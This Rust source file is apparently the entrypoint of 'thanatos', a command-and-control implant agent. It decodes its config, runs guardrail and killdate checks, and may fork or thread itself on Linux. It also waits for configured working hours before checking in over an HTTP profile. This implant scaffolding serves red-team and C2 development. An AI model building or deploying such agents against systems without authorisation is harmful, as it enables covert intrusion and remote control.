#![forbid(unsafe_code)]

use agent::Agent;
use chrono::{DateTime, TimeDelta};
use prost::Message;
use thanatos_protos::config::{config::Profile, Config, InitAction};
use timecheck::{check_working_hours, passed_killdate};

mod agent;
mod crypto;
mod errors;
mod guardrails;
mod logging;
mod system;
mod timecheck;

pub fn entrypoint(config: &[u8]) {
    let agent_config = match thanatos_protos::config::Config::decode(config) {
        Ok(c) => c,
        Err(e) => {
            log!("Failed to decode config: {:?}", e);
            return;
        }
    };

    if !guardrails::run_checks(&agent_config) {
        return;
    }

    if !profiles_available(&agent_config) {
        log!("All profiles have passed their killdates");
        return;
    }

    match agent_config.initaction() {
        InitAction::None => run_agent(agent_config),
        InitAction::Thread => {
            std::thread::spawn(|| run_agent(agent_config));
        }
        InitAction::Fork => {
            #[cfg(target_os = "linux")]
            {
                use ffiwrappers::linux::fork;
                match fork::fork() {
                    Ok(fork::ForkProcess::Child) => run_agent(agent_config),
                    Err(e) => {
                        log!("Failed to fork process: {:?}", e);
                    }
                    _ => (),
                }
            }

            #[cfg(target_os = "windows")]
            run_agent(agent_config);
        }
    };
}

fn run_agent(agent_config: Config) {
    if let Some(working_hours) = agent_config.working_hours.as_ref() {
        let start_time = TimeDelta::minutes(working_hours.start.into());
        let end_time = TimeDelta::minutes(working_hours.end.into());
        if let Some(Ok(sleep_delta)) = check_working_hours(start_time, end_time).map(|v| v.to_std())
        {
            std::thread::sleep(sleep_delta);
            if !profiles_available(&agent_config) {
                log!("All profiles have passed their killdates");
                return;
            }
        }
    }

    if let Ok(agent_instance) = Agent::perform_checkin(agent_config) {
        agent_instance.run();
    }
}

fn profiles_available(agent_config: &Config) -> bool {
    let http_active = if let Some(Profile::Http(profile)) = agent_config.profile.as_ref() {
        DateTime::from_timestamp(profile.killdate as i64, 0)
            .map(|killdate| !passed_killdate(killdate))
            .unwrap_or(false)
    } else {
        false
    };

    if !http_active {
        false
    } else {
        true
    }
}
